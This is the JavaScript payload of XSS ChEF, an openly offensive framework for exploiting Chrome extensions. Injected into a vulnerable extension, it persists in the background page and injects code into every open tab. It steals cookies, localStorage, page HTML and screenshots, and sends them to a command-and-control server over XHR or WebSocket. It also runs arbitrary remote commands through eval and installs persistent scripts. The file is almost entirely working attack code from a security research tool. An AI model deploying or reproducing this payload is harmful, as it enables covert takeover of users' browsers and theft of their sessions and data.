/*
    XSS ChEF - Chrome Extension Exploitation framework
    Copyright (C) 2012  Krzysztof Kotowicz - http://blog.kotowicz.net

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
    
    This program includes ReconnectingWebSocket project by Joe Walnes
    licenced under MIT licence:
    <https://github.com/joewalnes/reconnecting-websocket/>
*/
function __xsschef() {
    if (window.__xsschef_init) { // prevent double inclusion
        return;
    }
    window.__xsschef_init = true;

    var debug = !!'__DEBUG__';
    
    var dbg = function() {
        if (debug) {
            console.log('xsschef',arguments);
            console.trace();
        }
    };

    (function() {
        // fix JSON.stringify broken in some extensions
        var dummy = { data: [{hello: 'world'}] }, test = {};
        if(Array.prototype.toJSON) {
            try {
                test = JSON.parse(JSON.stringify(dummy));
                if(!test || dummy.data !== test.data) {
                    delete Array.prototype.toJSON;
                }
            } catch(e) {
                // there only hope
            }
        }        
    })();

    var myHook;
    try{
        if(!(myHook = localStorage['innocuous'])) { 
            myHook = "__CHANNEL__";
            // only use localStorage if extension doesn't use it itself 
            if (localStorage.length == 0) {
                localStorage['innocuous'] = myHook;
            }
        }
    } catch (e) {}
    var MY_TAB_ID = -1;
    
    var persistentScripts = {};

    // these scripts gets executed in sheepchannel tab context, they're written here only for syntax highlighting & easy editing
    // START scripts
    var sheepchannel_script = function(msg) {
        /* receive commands from ext and pass the results back */
        switch (msg.cmd) {
            case 'sendhtml':
                var links = [];

                var nodes = document.getElementsByTagName('a');
                for (var i = 0; i < nodes.length; i++) {
                    if (nodes[i].href) {
                        links.push({'href':nodes[i].href, 'title':nodes[i].title, 'html':nodes[i].innerHTML});
                    }
                }                
                __p.postMessage({cmd:'recvstuff', p: {'html':document.documentElement.innerHTML, 'links':links}});
            break;
            case 'sendinfo':
                __p.postMessage({cmd:'recvstuff', p: {'cookies':document.cookie, 'localStorage': localStorage}});
            break;
            case 'eval':
                __logEval(eval(msg.p));
            break;
        }
    }
    
    var backchannel_script = function(__p) {
        var url = '__URL__';
        if (url.match(/^http/)) { // http backchannel

            dbg('setting http channel', url);
            /* receive commands from ext and send the results to c&c */
            __p.onMessage.addListener(function(msg) {
                switch (msg.cmd) {
                    case 'log':
                        var x = new XMLHttpRequest();
                        x.open('POST', url + '?ch='+myHook, true);
                        x.send(JSON.stringify(msg.p));
                    break;
                }
            });
                
           /* poll for commands from c&c server and send them to ext */
            setInterval(function() {
                var x = new XMLHttpRequest();
                x.open('GET', url + '?ch='+myHook+'-cmd', true);
                x.onreadystatechange = function () {
                  if (x.readyState == 4 && x.status == 200) {
                    try {
                        var cmds = JSON.parse(x.responseText);
                        for (var i = 0; i < cmds.length; i++) {
                            dbg('received command', cmds[i]);
                            // forward command to extension
                            __p.postMessage(cmds[i]);
                        }
                    } catch(e) {}
                  }
                };
                x.send(null);
            }, 2000);

        } else if (url.match(/^ws/)) { // WebSocket based backchannel
            dbg('setting ws channel', url);
            function ReconnectingWebSocket(a,prot){function f(g){c=new WebSocket(a,prot);var h=c;var i=setTimeout(function(){e=true;h.close();e=false},b.timeoutInterval);c.onopen=function(c){clearTimeout(i);b.readyState=WebSocket.OPEN;g=false;b.onopen(c)};c.onclose=function(h){clearTimeout(i);c=null;if(d){b.readyState=WebSocket.CLOSED;b.onclose(h)}else{b.readyState=WebSocket.CONNECTING;if(!g&&!e){b.onclose(h)}setTimeout(function(){f(true)},b.reconnectInterval)}};c.onmessage=function(c){b.onmessage(c)};c.onerror=function(c){b.onerror(c)}}this.debug=false;this.reconnectInterval=1e3;this.timeoutInterval=2e3;var b=this;var c;var d=false;var e=false;this.url=a;this.prot=prot;this.readyState=WebSocket.CONNECTING;this.URL=a;this.onopen=function(a){};this.onclose=function(a){};this.onmessage=function(a){};this.onerror=function(a){};f(a);this.send=function(d){if(c){return c.send(d)}else{throw"INVALID_STATE_ERR : Pausing to reconnect websocket"}};this.close=function(){if(c){d=true;c.close()}};this.refresh=function(){if(c){c.close()}}};
        
            var ws = new ReconnectingWebSocket(url,'chef');

            /* receive commands from ext and send the results to c&c */
            __p.onMessage.addListener(function(msg) {
                dbg('to c&c', msg);
                switch (msg.cmd) {
                    case 'log':
                        ws.send(JSON.stringify({cmd:'post', p: msg.p}));
                    break;
                }
            });

            ws.onmessage = function(e) { // receive commands
                try {
                    var cmds = JSON.parse(e.data);
                    for (var i = 0; i < cmds.length; i++) {
                        // forward command to extension
                        dbg('received command', cmds[i]);                        
                        __p.postMessage(cmds[i]);
                    }
                } catch(e) {}
            }
            ws.onopen = function() {
                ws.send(JSON.stringify({cmd:'hello-hook',ch: myHook}));
            };
        }
        
    }

    
    // END scripts


    var log = function() {
        if (backchannel) {
            backchannel.postMessage({'cmd':'log', 'p': [].slice.call(arguments)});
        } else {
            dbg('no backchannel :/');
        }
        dbg.apply(this,[].slice.call(arguments));
    };
    
    var __logEval = function(obj) {
        return log({type:"recveval",result:obj});
    };

    var backchannel;
    var sheeps = {};
    
    function runPersistentScripts(tab) {
        Object.keys(persistentScripts).forEach(function(key) {
            try {
                var script = persistentScripts[key];
                var r = new RegExp(script.urlmatch);
                if (tab.url.match(r)) {
                    chrome.tabs.executeScript(tab.id, {'code': script.code});
                }
            } catch (e) {}
        });
    }
    
    // when tab has been created/updated
    chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
        if (changeInfo.status == 'complete') {
            addSheep(tab);
    
            if (backchannel && backchannel.tab.id == tabId) {
                // backchannel changed, re-establish
                setupBackchannel(tabId, report_tabs);
            } else {
                report_tabs();
            }

            runPersistentScripts(tab);
        }
    });

    // when tab has been removed
    chrome.tabs.onRemoved.addListener(function(tabId, changeInfo) {
        delete sheeps[tabId];
        if (backchannel && backchannel.tab.id == tabId) {
            // backchannel removed, re-establish
            chrome.tabs.getSelected(null, function(t) {
                setupBackchannel(t.id, report_tabs);
            });
        } else {
            report_tabs();
        }
    });
    
    // establish sheepchannel
    var addSheep = function(tab) {
        sheeps[tab.id] = tab;

        try {
            chrome.tabs.executeScript(tab.id, 
                {'code': '(function(){window.__logScript=function(name,obj){__p.postMessage({cmd:"recvpersistent", name:name, p:obj})};window.__logEval=function(obj){__p.postMessage({cmd:"recveval", p:obj});};window.__p=chrome.extension.connect({name:"sheepchannel"});__p.onMessage.addListener('+sheepchannel_script.toString()+');})();'}
            );
        } catch(e) {
            delete sheeps[tab.id];
        }
    }
    
    function processCommands(msg, port) {
            switch (msg.cmd) {
                // these commands come from sheeps
                case 'recvstuff': // from sheeps
                case 'recveval': // from sheeps
                    log({type: msg.cmd, id:port.tab.id, url:port.tab.url, result: msg.p});
                break;
                case 'recvpersistent': // from sheeps 
                    log({type: msg.cmd, id:port.tab.id, url:port.tab.url, result: msg.p, name: msg.name});
                break;                
                // all below commands are from backchannel
                case 'eval':
                    if (msg.id) { // eval in sheep
                        log('eval ' + msg.p + ' in sheep');
                        postToSheep(msg.id, {p: msg.p, cmd: 'eval'});
                    } else { // eval in extension
                        log({type: 'recveval',result: eval(msg.p)});
                    }
                break;
                case 'ping':
                    log({type: 'pong', id: port.tab.id, url: port.tab.url});
                break;
                case 'focus':
                    chrome.tabs.update(msg.id, {active: true});
                break;
                case 'screenshot':
                    if (msg.id) { // try to capture other tab
                        chrome.tabs.query({active: true}, function(tabs) {
                            var prev_id;
                            if (tabs[0]) {
                                prev_id = tabs[0].id;
                                // switch tabs
                                chrome.tabs.update(msg.id, {active: true}, function(t) {
                                    // take screenshot
                                    chrome.tabs.captureVisibleTab(null,null, function(data_url) {
                                        log({type:'recvscreenshot', url: data_url});
                                        // switch tabs back
                                        chrome.tabs.update(prev_id, {active: true});
                                    });
                                });
                            }
                        });
                    } else { // capture current tab
                        chrome.tabs.captureVisibleTab(null,null, function(data_url) {
                            log({type:'recvscreenshot', url: data_url});
                        });
                    }
                break;
                case 'report':
                    report_tabs();
                    report_page_info();
                    report_ext();
                    report_persistent();
                break;
                case 'reportpageinfo':
                        postToSheep(msg.id, {cmd: 'sendinfo'});
                break;
                case 'reporthtml':
                        postToSheep(msg.id, {cmd: 'sendhtml'});
                break;
                case 'reportcookies':
                    chrome.tabs.get(msg.id, function(t) {
                        var cookstr = "No cookies permissions in extension";
                        chrome.cookies.getAll({
                            url: t.url
                        }, function(cookies) {
                            cookstr = "";
                            cookies.forEach(function(cookie) {
                                cookstr += encodeURIComponent(cookie.name) + '=' + encodeURIComponent(cookie.value)+'; '; 
                            });
                        });

                        setTimeout(function() {
                            log({type:"recvstuff",  id: t.id, url: t.url , result: {'allcookies':cookstr}});
                        }, 300);
                    });
                break;
                case 'createtab':
                    chrome.tabs.create({url: msg.p, active: false});
                break;
                case 'addpersistent':
                    // p:{name:"script name",urlmatch: "http://", code: "alert(1)", run_now: false} 
                    persistentScripts[msg.p.name] = msg.p;
                    if (msg.p.run_now) {
                        chrome.tabs.query({}, function(tabs) {
                            for (var i=0; i<tabs.length;i++) {
                                runPersistentScripts(tabs[i]);
                            }
                        });
                    }
                    log("added persistent script " + msg.p.name);
                    report_persistent();
                break;
                case 'removepersistent':
                    // p: "script name"
                    delete persistentScripts[msg.p];
                    log("removed persistent script " + msg.p.name);
                    report_persistent();
                break;
                case 'reportpersistent':
                    report_persistent();
                break;
            }
        }

    // setup listener from sheeps/backchannel
    chrome.extension.onConnect.addListener(function(port) {
        if (port.name == 'backchannel') {
            backchannel = port;
        } else if (port.name == 'sheepchannel') {
            sheeps[port.tab.id].port = port;
        }
        
        port.onMessage.addListener(function(msg) {processCommands(msg, port)});
    });
    
    // setup sheepchannel scripts in all tabs (sheeps)
    chrome.tabs.query({}, function(tabs) {
        for (var i=0; i<tabs.length;i++) {
            addSheep(tabs[i]);
            runPersistentScripts(tabs[i]);
        }
    });
    
    var FakePort = function(name, tab_id) {
        var self = this;
        
        function _notify(msg, side) {
            self[side].listeners.forEach(function(f) {
                f.apply(self[side], [msg]);
            });
        }
        
        this.local = {
            name: name,
            tab: {id: tab_id, url: location.href },
            listeners : [],
            postMessage: function(msg) {
                _notify(msg,'remote');
            },
            onMessage: {
                addListener: function(f) {
                    self.local.listeners.push(f);
                }
            }
        };
        
        this.remote = {
            name: name,
            tab: {id: tab_id, url: location.href },
            listeners : [],
            postMessage: function(msg) {
                _notify(msg,'local');
            },
            onMessage: {
                addListener: function(f) {
                    self.remote.listeners.push(f);
                }
            }
        }
        
        return {
            local: this.local,
            remote: this.remote
        }
    };

    var setupBackchannel = function(tabId, oncomplete) {
        if (tabId == MY_TAB_ID) {
            dbg("fake port backchannel");
            // fake port needs to be set up, chrome f*cks up allow port connections within the same window
            var port = new FakePort('backchannel', MY_TAB_ID);
            port.local.onMessage.addListener(function(msg) {processCommands(msg, port.local)});
            backchannel = port.local;
            backchannel_script(port.remote);
            setTimeout(oncomplete, 500);
        } else {
            chrome.tabs.executeScript(tabId, 
                {'code': '(function(){var __p=chrome.extension.connect({name:"backchannel"});('+backchannel_script.toString()+')(__p);})();'}
                    ,function() {setTimeout(oncomplete, 500)});
        }
    }
    
    // todo: make ext the backchannel itself, if permissions allow
    chrome.permissions.getAll(function(perms) {
        var yes_i_can = false;
        
        // cause chrome.permissions.contains suck and does not resolve <all_urls> into http://*/*
        if (window === chrome.extension.getBackgroundPage()
            && perms.origins
            && (perms.origins.indexOf('<all_urls>') >= 0
               || perms.origins.indexOf('http://*/*') >= 0)) {
            
            // extension can communicate directly from background page
            yes_i_can = true;
        }
        
        if (yes_i_can) { // this does not for for now, don't know why
            // extension has permissions for XHR on our C&C domain
            // and set a direct log function
            setupBackchannel(MY_TAB_ID, init_complete);
        } else {
            // proxy the requests to C&C through backchannel tab
            // setup backchannel port in first http/https tab
            chrome.tabs.query({url: '<all_urls>', status: 'complete'}, function(tabs) {
                var t;
                for (var i=0; i<tabs.length; i++) {
                    t = tabs[i];
                    if (t.url.match(/^http/)) {
                        setupBackchannel(t.id, init_complete);
                        return;
                    }
                }
            }); 
        }
    });


    var report_tabs = function() {
        log('reporting tabs');
        chrome.tabs.query({}, function(t) {
            log({type: 'report_tabs','result':t});
        });
    }
    
    var report_persistent = function() {
        log('reporting persistent');
        var clone = [];
        Object.keys(persistentScripts).forEach(function(key) {
            clone.push({ name: key, 
                         urlmatch: persistentScripts[key].urlmatch, 
                         code: persistentScripts[key].code.substr(0,100) + "..."
                      });
        });

        log({type: 'report_persistent', 'result': clone});
    }
    
    var postToSheeps = function(msg) {
        for (var i in sheeps) {
            postToSheep(i,msg);
        }
    }
    
    var postToSheep = function(i,msg) {
        if (sheeps[i].port) {
            sheeps[i].port.postMessage(msg);
        }
    }
    
    var report_page_info = function() {
        postToSheeps({'cmd':'sendinfo'});
    }

    var report_ext = function() {
        chrome.permissions.getAll(function(perm) {
            log({type:'report_ext',result:{'extension': location.href,
                                           'permissions': perm,
                                           'html':document.documentElement.innerHTML,
                                           'cookies':document.cookie,
                                           'localStorage': localStorage}});
        });
    }
    
    var init_complete = function() { // framework ready
        if (window === chrome.extension.getBackgroundPage()) {
            log('persisted in background page :)');
        } else {
            log('no persistence :/');
        }
        log('foothold started');
        report_tabs();
        report_ext();
        report_persistent();
        if ('__URL__'.match(/^http/)) { // we need to keep the connection alive
            setInterval(function() {
                log('alive');
            }, 20000);
        }
    }
};

if (location.protocol == 'chrome-extension:') { // evaluate only in extension code
    if (chrome.extension.getBackgroundPage() && window !== chrome.extension.getBackgroundPage()) {// try to persist in background page
        // chrome 18 csp fix - maybe add https:// script to document.body and hope for relaxed CSP policy?
        chrome.extension.getBackgroundPage().eval.apply(chrome.extension.getBackgroundPage(), [__xsschef.toString()+ ";__xsschef();"]);
    } else {
        __xsschef(); // no persistence :(
    }
}
